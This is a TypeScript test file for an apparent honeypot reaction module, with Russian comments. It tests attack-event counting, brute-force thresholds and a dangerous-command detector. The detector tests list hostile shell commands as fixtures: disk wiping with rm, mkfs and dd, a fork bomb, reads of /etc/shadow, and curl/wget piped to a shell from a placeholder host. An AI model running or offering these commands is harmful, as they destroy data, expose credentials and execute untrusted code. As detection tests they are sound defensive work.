import { describe, expect, it } from 'vitest';
import {
  ReactionMemory, isDangerousCommand, STORM_THRESHOLD, STORM_WINDOW_MS,
  MAX_REACTION_KEYS, MAX_REACTION_HITS, type AttackPayload,
} from './reactions';

/** Базовый payload атаки; перекрываем только нужные поля. */
const pay = (over: Partial<AttackPayload> = {}): AttackPayload => ({
  ip: '192.0.2.1', protocol: 'ssh', username: 'root', success: false,
  command: '', truncated: false, method: '', bytes: null, ...over,
});

describe('ReactionMemory: нарастание по ленте', () => {
  it('удаляет истёкшие адреса при событии другого типа и другого источника', () => {
    const m = new ReactionMemory();
    for (let i = 0; i < 100; i++) m.enrich('attack:connect', pay({ ip: `source-${i}` }), 0);
    m.enrich('attack:command', pay({ ip: 'new-source', command: 'ls' }), STORM_WINDOW_MS);
    // Проверяем освобождение памяти, а не только внешний сброс счётчика.
    expect(Reflect.get(m, 'hits').size).toBe(0);
  });

  it('при переполнении вытесняет старый адрес, сохраняя недавно обновлённый', () => {
    const m = new ReactionMemory();
    for (let i = 0; i < MAX_REACTION_KEYS; i++) m.enrich('attack:connect', pay({ ip: `source-${i}` }), 0);
    expect(m.enrich('attack:connect', pay({ ip: 'source-0' }), 1).repeat).toBe(2);
    m.enrich('attack:connect', pay({ ip: 'overflow' }), 2);
    expect(Reflect.get(m, 'hits').size).toBe(MAX_REACTION_KEYS);
    expect(m.enrich('attack:connect', pay({ ip: 'source-0' }), 3).repeat).toBe(3);
    expect(m.enrich('attack:connect', pay({ ip: 'source-1' }), 4).repeat).toBe(1);
  });

  it('ограничивает метки одного источника и не повторяет тревогу при насыщении', () => {
    const m = new ReactionMemory();
    let milestones = 0;
    for (let i = 0; i < MAX_REACTION_HITS * 3; i++) {
      const e = m.enrich('attack:auth', pay(), 0);
      if (e.milestone) milestones++;
      expect(e.repeat).toBe(Math.min(i + 1, MAX_REACTION_HITS));
    }
    expect(milestones).toBe(1);
    expect(Reflect.get(m, 'hits').get('attack:auth:192.0.2.1')).toHaveLength(MAX_REACTION_HITS);
    expect(m.enrich('attack:auth', pay(), STORM_WINDOW_MS).repeat).toBe(1);
  });
  it('считает однотипные события с адреса в окне, растёт repeat', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:connect', pay(), 0).repeat).toBe(1);
    expect(m.enrich('attack:connect', pay(), 100).repeat).toBe(2);
    expect(m.enrich('attack:connect', pay(), 200).repeat).toBe(3);
  });

  it('разные адреса и разные сигналы считаются независимо', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:connect', pay({ ip: '192.0.2.1' }), 0).repeat).toBe(1);
    expect(m.enrich('attack:connect', pay({ ip: '192.0.2.2' }), 0).repeat).toBe(1);
    expect(m.enrich('attack:auth', pay({ ip: '192.0.2.1' }), 0).repeat).toBe(1);
  });

  it('события старше окна выпадают из счёта', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:connect', pay(), 0).repeat).toBe(1);
    // На границе окна прежнее ещё считается, за окном — уже нет.
    expect(m.enrich('attack:connect', pay(), STORM_WINDOW_MS - 1).repeat).toBe(2);
    expect(m.enrich('attack:connect', pay(), STORM_WINDOW_MS * 2).repeat).toBe(1);
  });

  it('вход считаем штормом только по неудачам; успех не копится', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:auth', pay({ success: false }), 0).repeat).toBe(1);
    expect(m.enrich('attack:auth', pay({ success: false }), 1).repeat).toBe(2);
    // Успех не относится к перебору — отдельный счёт не ведём.
    expect(m.enrich('attack:auth', pay({ success: true }), 2).repeat).toBe(1);
  });

  it('веха перебора — ровно при достижении порога, один раз', () => {
    const m = new ReactionMemory();
    const flags: boolean[] = [];
    for (let i = 0; i < STORM_THRESHOLD + 2; i++) flags.push(m.enrich('attack:auth', pay({ success: false }), i).milestone);
    // true только на STORM_THRESHOLD-м событии (индекс THRESHOLD-1).
    expect(flags.filter(Boolean)).toHaveLength(1);
    expect(flags[STORM_THRESHOLD - 1]).toBe(true);
  });

  it('первый успешный вход за сессию помечается один раз', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:auth', pay({ success: true }), 0).first).toBe(true);
    expect(m.enrich('attack:auth', pay({ success: true }), 1).first).toBe(false);
    // Неудача первым входом не считается.
    const m2 = new ReactionMemory();
    expect(m2.enrich('attack:auth', pay({ success: false }), 0).first).toBe(false);
  });

  it('варианты чередуются на сигнал и независимо между сигналами', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:connect', pay(), 0).variant).toBe(0);
    expect(m.enrich('attack:connect', pay(), 1).variant).toBe(1);
    expect(m.enrich('attack:connect', pay(), 2).variant).toBe(2);
    // Другой сигнал ведёт свой счёт с нуля.
    expect(m.enrich('attack:command', pay({ command: 'ls' }), 3).variant).toBe(0);
  });

  it('опасность команды — только для attack:command и по совпадению', () => {
    const m = new ReactionMemory();
    expect(m.enrich('attack:command', pay({ command: 'rm -rf /' }), 0).danger).toBe(true);
    expect(m.enrich('attack:command', pay({ command: 'ls -la' }), 1).danger).toBe(false);
    // Тот же текст, но не команда — не тревога.
    expect(m.enrich('attack:connect', pay({ command: 'rm -rf /' }), 2).danger).toBe(false);
  });
});

describe('isDangerousCommand', () => {
  it('ловит опасные шаблоны и снимает управляющие символы', () => {
    for (const cmd of [
      'rm -rf /', 'rm -fr /home', 'rm -r -f /', 'rm -f -r /', 'rm -f -R /',
      'sudo /bin/rm -v -r -f /tmp/demo', 'rm\t-r\t-f /tmp/demo', 'rm -rf;',
      'mkfs.ext4 /dev/sda', 'dd if=/dev/zero of=/dev/sda',
      ':(){ :|:& };:', 'chmod 777 /etc', 'cat /etc/passwd', 'cat /etc/shadow',
      'wget http://x/a.sh | sh', 'curl http://x/a | bash', 'cat x > /dev/sda',
      '\u001b[31mrm -rf /\u001b[0m',
    ]) {
      expect(isDangerousCommand(cmd), cmd).toBe(true);
    }
  });

  it('безопасные команды не тревожат', () => {
    for (const cmd of ['ls -la', 'whoami', 'uname -a', 'cat readme.txt', 'echo hi', '',
      'rm -r file-f', 'rm -f file-r', 'rm -- -rf', 'rm -r -- -f',
      'rm -r; echo -f', 'rm -r\necho -f']) {
      expect(isDangerousCommand(cmd), cmd).toBe(false);
    }
  });
});
